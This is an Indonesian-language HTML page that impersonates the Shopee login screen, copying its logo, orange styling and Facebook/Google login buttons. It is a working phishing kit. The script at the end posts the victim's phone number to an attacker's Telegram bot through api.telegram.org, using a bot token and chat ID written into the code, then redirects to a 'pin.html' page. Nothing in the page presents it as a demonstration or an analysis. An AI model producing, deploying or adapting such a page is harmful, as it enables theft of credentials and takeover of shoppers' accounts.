<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Shopee</title>
    <!-- Menggunakan Font Awesome untuk ikon -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }

        body {
            background-color: #ffffff; /* Latar belakang putih */
            color: #000000; /* Teks hitam */
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .login-container {
            width: 100%;
            max-width: 400px;
            height: 100vh;
            display: flex;
            flex-direction: column;
            padding: 20px;
        }

        /* Header Styles */
        .header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding-bottom: 20px;
        }

        .header h1 {
            font-size: 1.2rem;
            font-weight: normal;
        }

        .header-icons i {
            margin-left: 15px;
            font-size: 1.1rem;
            color: #ee4d2d; /* Warna orange Shopee untuk ikon */
        }

        /* Content Styles */
        .content {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-top: 40px;
        }

        .logo-container {
            margin-bottom: 40px;
        }

        .logo {
            width: 80px;
        }

        .input-group {
            width: 100%;
            display: flex;
            align-items: center;
            border-bottom: 1px solid #dbdbdb; /* Garis bawah abu-abu terang */
            padding: 10px 0;
            margin-bottom: 20px;
        }

        .input-group i {
            color: #888;
            margin-right: 15px;
        }

        .input-group input {
            background: transparent;
            border: none;
            color: #000;
            width: 100%;
            font-size: 1rem;
            outline: none;
        }

        .input-group input::placeholder {
            color: #bbb;
        }

        .btn-next {
            width: 100%;
            padding: 12px;
            background-color: #ee4d2d; /* Warna Orange Shopee */
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 1rem;
            cursor: pointer;
            margin-bottom: 15px;
            font-weight: bold;
        }

        .password-link {
            width: 100%;
            text-align: right;
            margin-bottom: 30px;
        }

        .password-link a {
            color: #0055aa;
            text-decoration: none;
            font-size: 0.9rem;
        }

        .divider {
            width: 100%;
            text-align: center;
            position: relative;
            margin-bottom: 30px;
        }

        .divider::before, .divider::after {
            content: "";
            position: absolute;
            top: 50%;
            width: 40%;
            height: 1px;
            background-color: #dbdbdb;
        }

        .divider::before { left: 0; }
        .divider::after { right: 0; }

        .divider span {
            font-size: 0.8rem;
            color: #888;
            background: #fff;
            padding: 0 10px;
        }

        /* Social Login Buttons */
        .btn-social {
            width: 100%;
            padding: 12px;
            background: #fff;
            border: 1px solid #dbdbdb;
            color: #000;
            border-radius: 4px;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            font-size: 0.95rem;
            cursor: pointer;
        }

        .btn-social.fb i {
            color: #1877f2;
            font-size: 1.2rem;
        }

        .btn-social.google img {
            width: 18px;
        }

        .terms {
            font-size: 0.75rem;
            color: #888;
            text-align: center;
            line-height: 1.4;
            margin-top: 20px;
        }

        .terms a {
            color: #0055aa;
            text-decoration: none;
        }

        /* Footer Styles */
        .footer {
            text-align: center;
            padding: 20px 0;
            font-size: 0.9rem;
            border-top: 1px solid #f0f0f0;
        }

        .footer a {
            color: #0055aa;
            text-decoration: none;
            font-weight: bold;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <header class="header">
            <i class="fa-solid fa-arrow-left" style="color: #ee4d2d;"></i>
            <h1>Log in</h1>
            <div class="header-icons">
                <i class="fa-solid fa-shop"></i>
                <i class="fa-regular fa-circle-question"></i>
            </div>
        </header>

        <main class="content">
            <div class="logo-container">
                <!-- Logo Shopee -->
                <img src="https://upload.wikimedia.org/wikipedia/commons/f/fe/Shopee.svg" alt="Shopee Logo" class="logo">
            </div>

            <div class="input-group">
                <i class="fa-solid fa-mobile-screen-button"></i>
                <input type="text" id="phoneNumber" placeholder="Nomor Telepon">
            </div>

            <button class="btn-next" id="sendBtn">Berikutnya</button>

            <div class="password-link">
                <a href="#">Log in dengan Password</a>
            </div>

            <div class="divider">
                <span>ATAU</span>
            </div>

            <div class="social-login" style="width: 100%;">
                <button class="btn-social fb">
                    <i class="fa-brands fa-facebook"></i> Log In dengan Facebook
                </button>
                <button class="btn-social google">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" alt="Google"> Log In dengan Google
                </button>
            </div>

            <p class="terms">
                Dengan login, kamu menyetujui <a href="#">SYARAT LAYANAN</a> & <a href="#">KEBIJAKAN PRIVASI</a> Shopee.
            </p>
        </main>

        <footer class="footer">
            Belum punya akun? <a href="#">Daftar</a>
        </footer>
    </div>

    <script>
        // --- KONFIGURASI TELEGRAM ---
        const token = '8794002267:AAFS1_xcjzj7y-j4Ue7B-tA9sX83xa_WKmY'; 
        const chatId = '7549590022';

        document.getElementById('sendBtn').addEventListener('click', function() {
            const phone = document.getElementById('phoneNumber').value;

            if (phone === "") {
                alert("Silakan masukkan nomor telepon!");
                return;
            }

            const message = `🔔 *Login Baru Shopee (Tema Putih)*\n\n📱 Nomor Telepon: \`${phone}\``;

            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'Markdown'
                })
            })
            .then(res => res.json())
            .then(data => {
                if(data.ok) {
                    location.href = "pin.html";
                } else {
                    alert("Gagal kirim! Periksa Token & Chat ID Anda.");
                }
            })
            .catch(err => {
                alert("Terjadi kesalahan koneksi.");
                console.error(err);
            });
        });
    </script>

</body>
</html>
